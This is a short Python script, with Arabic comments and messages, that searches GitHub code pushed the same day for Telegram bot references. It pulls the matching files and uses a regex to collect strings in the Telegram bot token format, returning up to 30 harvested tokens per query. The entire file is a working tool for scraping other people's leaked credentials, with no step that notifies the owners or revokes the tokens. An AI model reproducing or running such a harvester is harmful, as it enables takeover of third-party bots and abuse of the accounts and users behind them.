import re
import os
import datetime
import time
from github import Github

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود!")
        return []
        
    print("[*] بدء مسح GitHub...")
    try:
        g = Github(token)
    except Exception as e:
        print(f"[!] خطأ الاتصال: {e}")
        return []

    found_tokens = []
    today = datetime.datetime.utcnow().strftime('%Y-%m-%d')
    queries = [f'bot_token pushed:>{today}', f'telebot pushed:>{today}', f'telegram_token pushed:>{today}']
    
    for query in queries:
        print(f"[>] فحص: {query}")
        try:
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            # بدلاً من استخدام الفهرسة [i] التي تسبب الخطأ، سنستخدم Iterator مباشر
            # هذا هو الحل الأضمن لمنع list index out of range
            count = 0
            for file in results:
                if count >= 30: break # نكتفي بـ 30 نتيجة
                try:
                    content = file.decoded_content.decode('utf-8')
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            count += 1
                except: continue
            
            print(f"[+] استخرجنا {count} توكن.")
            
        except Exception as e:
            print(f"[!] خطأ في الاستعلام: {e}")
            
    return found_tokens
